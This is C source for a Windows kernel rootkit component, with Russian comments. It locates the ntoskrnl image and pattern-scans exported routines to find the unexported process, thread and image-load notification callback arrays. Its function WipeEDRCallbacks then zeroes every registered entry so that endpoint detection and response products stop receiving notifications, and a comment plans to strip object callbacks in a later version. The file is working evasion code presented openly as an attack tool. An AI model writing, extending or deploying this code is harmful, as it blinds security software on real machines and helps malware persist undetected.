#include "rootkit.h"

// PspCreateProcessNotifyRoutine — не экспортирована, ищем паттерном в ntoskrnl
// массив из 64 указателей EX_CALLBACK_ROUTINE_BLOCK*
// младшие 4 бита = флаги, остаток = реальный указатель (& ~0xF)
#define MAX_NOTIFY_ROUTINES 64

// паттерн для поиска PspCreateProcessNotifyRoutine через PsSetCreateProcessNotifyRoutine
// Win10/11 x64: lea rcx, [PspCreateProcessNotifyRoutine] внутри функции
static PVOID FindNtoskrnlBase() {
    // IdtEntry → ServiceDescriptorTable → ntoskrnl
    // проще: идём от любого экспортированного символа назад до MZ
    PUCHAR p = (PUCHAR)(ULONG_PTR)PsInitialSystemProcess;

    // выравниваем на страницу и идём назад ища MZ
    p = (PUCHAR)((ULONG_PTR)p & ~0xFFFULL);
    for (LONG_PTR i = 0; i > -0x10000000LL; i -= 0x1000) {
        PUCHAR cur = p + i;
        __try {
            if (cur[0] == 'M' && cur[1] == 'Z')
                return cur;
        } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }
    return NULL;
}

static PVOID FindExport(PVOID base, const char* name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PUCHAR)base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (PUCHAR)base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PULONG  names    = (PULONG) ((PUCHAR)base + exp->AddressOfNames);
    PUSHORT ordinals = (PUSHORT)((PUCHAR)base + exp->AddressOfNameOrdinals);
    PULONG  funcs    = (PULONG) ((PUCHAR)base + exp->AddressOfFunctions);

    for (ULONG i = 0; i < exp->NumberOfNames; i++) {
        const char* n = (const char*)((PUCHAR)base + names[i]);
        if (strcmp(n, name) == 0)
            return (PUCHAR)base + funcs[ordinals[i]];
    }
    return NULL;
}

// ищем адрес массива PspCreateProcessNotifyRoutine паттерном внутри
// PsSetCreateProcessNotifyRoutineEx (экспортирована) — там есть lea на массив
static PVOID* FindCallbackArray(PVOID ntBase, const char* setRoutineExport) {
    PUCHAR fn = (PUCHAR)FindExport(ntBase, setRoutineExport);
    if (!fn) return NULL;

    // ищем паттерн lea r?x, [rip+offset] (0x4C 0x8D или 0x48 0x8D)
    // в районе первых 256 байт функции
    for (ULONG i = 0; i < 256; i++) {
        // lea rXX, [rip + disp32]
        if ((fn[i] == 0x4C || fn[i] == 0x48) &&
             fn[i+1] == 0x8D &&
            (fn[i+2] >= 0x05 && fn[i+2] <= 0x3D))
        {
            LONG disp = *(PLONG)(fn + i + 3);
            PVOID* arr = (PVOID*)(fn + i + 7 + disp);
            // проверяем что похоже на массив: первый элемент либо 0 либо валидный указатель
            if (MmIsAddressValid(arr) && (*arr == NULL || MmIsAddressValid((PVOID)((ULONG_PTR)*arr & ~(ULONG_PTR)0xF))))
                return arr;
        }
    }
    return NULL;
}

VOID WipeEDRCallbacks() {
    PVOID ntBase = FindNtoskrnlBase();
    if (!ntBase) return;

    // массивы callbacks
    const char* exports[] = {
        "PsSetCreateProcessNotifyRoutineEx",
        "PsSetCreateThreadNotifyRoutineEx",
        "PsSetLoadImageNotifyRoutineEx",
        NULL
    };

    for (ULONG e = 0; exports[e]; e++) {
        PVOID* arr = FindCallbackArray(ntBase, exports[e]);
        if (!arr) continue;

        for (ULONG i = 0; i < MAX_NOTIFY_ROUTINES; i++) {
            PVOID raw = arr[i];
            if (!raw) continue;

            // получаем реальный указатель (убираем флаги в младших битах)
            PVOID ptr = (PVOID)((ULONG_PTR)raw & ~0xFULL);
            if (!MmIsAddressValid(ptr)) continue;

            // проверяем что это не наш собственный callback (у нас нет)
            // просто зануляем — EDR теряет уведомления
            InterlockedExchangePointer(&arr[i], NULL);
        }
    }

    // дополнительно: ObRegisterCallbacks — используется EDR для защиты процессов
    // убираем через OB_OPERATION_REGISTRATION handle callbacks
    // (требует отдельного паттерн-поиска в ntoskrnl, добавим в v2)
}
